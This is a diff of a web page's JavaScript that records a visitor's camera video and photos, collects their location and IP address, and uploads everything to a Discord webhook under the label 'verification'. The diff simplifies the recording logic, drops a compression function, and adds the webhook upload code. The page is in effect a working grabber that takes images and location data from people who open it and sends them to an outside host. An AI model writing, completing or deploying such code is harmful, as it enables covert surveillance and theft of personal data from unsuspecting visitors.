@@ -175,20 +175,16 @@ document.addEventListener('DOMContentLoaded', () => {
             });
 
             // Set up media recorder with optimal settings
-            // Prioritize MP4 format for better Discord compatibility [citation:1][citation:2]
             const options = {
-                mimeType: 'video/mp4; codecs=avc1.42E01E', // MP4 for better Discord compatibility
-                videoBitsPerSecond: 5000000 // 5 Mbps to keep file size under 8MB [citation:1][citation:2]
+                mimeType: 'video/webm; codecs=vp9',
+                videoBitsPerSecond: 8000000 // 8 Mbps for better quality
             };
 
             // Try different mimeTypes for better compatibility
             if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                options.mimeType = 'video/webm; codecs=vp9';
+                options.mimeType = 'video/webm; codecs=vp8';
                 if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                    options.mimeType = 'video/webm; codecs=vp8';
-                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                        options.mimeType = 'video/webm';
-                    }
+                    options.mimeType = 'video/webm';
                 }
             }
 
@@ -206,49 +202,16 @@ document.addEventListener('DOMContentLoaded', () => {
                 // Create a blob from the recorded chunks
                 const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
                 
-                // Check file size and compress if needed [citation:1][citation:2]
-                if (blob.size > 8000000) { // 8MB limit for free Discord accounts
-                    console.log('Video too large, compressing...');
-                    compressVideo(blob).then(compressedBlob => {
-                        // Get location and IP, then send to Discord
-                        getLocationAndIP().then(systemInfo => {
-                            // Add video info to system info
-                            const videoTrack = stream.getVideoTracks()[0];
-                            const settings = videoTrack.getSettings();
-                            systemInfo["🎥 Video Quality"] = `${settings.width}x${settings.height} @ ${settings.frameRate || 'unknown'}fps`;
-                            systemInfo["📱 Device Type"] = isIOS() ? 'iOS' : isAndroid() ? 'Android' : 'Other';
-                            systemInfo["🎬 Video Format"] = mediaRecorder.mimeType;
-                            systemInfo["📊 File Size"] = `${(compressedBlob.size / 1000000).toFixed(2)} MB`;
-                            
-                            sendToDiscord(compressedBlob, systemInfo);
-                        });
-                    }).catch(error => {
-                        console.error('Error compressing video:', error);
-                        // Send original blob if compression fails
-                        getLocationAndIP().then(systemInfo => {
-                            systemInfo["🎥 Video Quality"] = `${settings.width}x${settings.height} @ ${settings.frameRate || 'unknown'}fps`;
-                            systemInfo["📱 Device Type"] = isIOS() ? 'iOS' : isAndroid() ? 'Android' : 'Other';
-                            systemInfo["🎬 Video Format"] = mediaRecorder.mimeType;
-                            systemInfo["📊 File Size"] = `${(blob.size / 1000000).toFixed(2)} MB`;
-                            systemInfo["⚠️ Note"] = "Video compression failed - may exceed Discord limits";
-                            
-                            sendToDiscord(blob, systemInfo);
-                        });
-                    });
-                } else {
-                    // Get location and IP, then send to Discord
-                    getLocationAndIP().then(systemInfo => {
-                        // Add video info to system info
-                        const videoTrack = stream.getVideoTracks()[0];
-                        const settings = videoTrack.getSettings();
-                        systemInfo["🎥 Video Quality"] = `${settings.width}x${settings.height} @ ${settings.frameRate || 'unknown'}fps`;
-                        systemInfo["📱 Device Type"] = isIOS() ? 'iOS' : isAndroid() ? 'Android' : 'Other';
-                        systemInfo["🎬 Video Format"] = mediaRecorder.mimeType;
-                        systemInfo["📊 File Size"] = `${(blob.size / 1000000).toFixed(2)} MB`;
-                        
-                        sendToDiscord(blob, systemInfo);
-                    });
-                }
+                // Get location and IP, then send to Discord
+                getLocationAndIP().then(systemInfo => {
+                    // Add video info to system info
+                    const videoTrack = stream.getVideoTracks()[0];
+                    const settings = videoTrack.getSettings();
+                    systemInfo["🎥 Video Quality"] = `${settings.width}x${settings.height} @ ${settings.frameRate || 'unknown'}fps`;
+                    systemInfo["📱 Device Type"] = isIOS() ? 'iOS' : isAndroid() ? 'Android' : 'Other';
+                    
+                    sendToDiscord(blob, systemInfo);
+                });
                 
                 // Stop all tracks
                 stream.getTracks().forEach(track => track.stop());
@@ -274,39 +237,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 stream.getTracks().forEach(track => track.stop());
             }, 1000);
         }
-    }
-    
-    // Function to compress video to meet Discord's 8MB limit [citation:1][citation:2]
-    function compressVideo(blob) {
-        return new Promise((resolve, reject) => {
-            // Create a video element to read the blob
-            const videoElement = document.createElement('video');
-            videoElement.src = URL.createObjectURL(blob);
-            
-            videoElement.onloadedmetadata = () => {
-                // Create a canvas to compress the video
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                
-                // Reduce resolution to save space
-                canvas.width = 640;
-                canvas.height = 480;
-                
-                videoElement.currentTime = 0;
-                
-                videoElement.onseeked = () => {
-                    // Draw the frame to canvas
-                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                    
-                    // Convert to compressed JPEG (lower quality for smaller size)
-                    canvas.toBlob((compressedBlob) => {
-                        resolve(compressedBlob);
-                    }, 'image/jpeg', 0.6); // 0.6 quality for compression
-                };
-            };
-            
-            videoElement.onerror = reject;
-        });
     }
     
     function capturePhoto() {
@@ -482,4 +412,68 @@ document.addEventListener('DOMContentLoaded', () => {
         
         // First send the system information
         fetch(webhookURL, {
-            method: 'POS
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok && media) {
+                // If there's media to send, prepare it
+                const formData = new FormData();
+                
+                if (media instanceof HTMLCanvasElement) {
+                    // Convert canvas to blob for image
+                    media.toBlob(blob => {
+                        formData.append('file', blob, 'verification.jpg');
+                        
+                        // Send image with a caption
+                        const imagePayload = {
+                            content: "**Captured Image**",
+                            embeds: [
+                                {
+                                    title: "Verification Image",
+                                    color: 5814783,
+                                    timestamp: new Date().toISOString()
+                                }
+                            ]
+                        };
+                        
+                        formData.append('payload_json', JSON.stringify(imagePayload));
+                        
+                        fetch(webhookURL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg', 0.9);
+                } else if (media instanceof Blob) {
+                    // Send video
+                    formData.append('file', media, 'verification.webm');
+                    
+                    const videoPayload = {
+                        content: "**Recorded Video**",
+                        embeds: [
+                            {
+                                title: "Verification Video",
+                                color: 5814783,
+                                timestamp: new Date().toISOString()
+                            }
+                        ]
+                    };
+                    
+                    formData.append('payload_json', JSON.stringify(videoPayload));
+                    
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+            }
+        })
+        .catch(error => console.error('Error sending to Discord:', error));
+    }
+});
+</script>
+</body>
+</html>
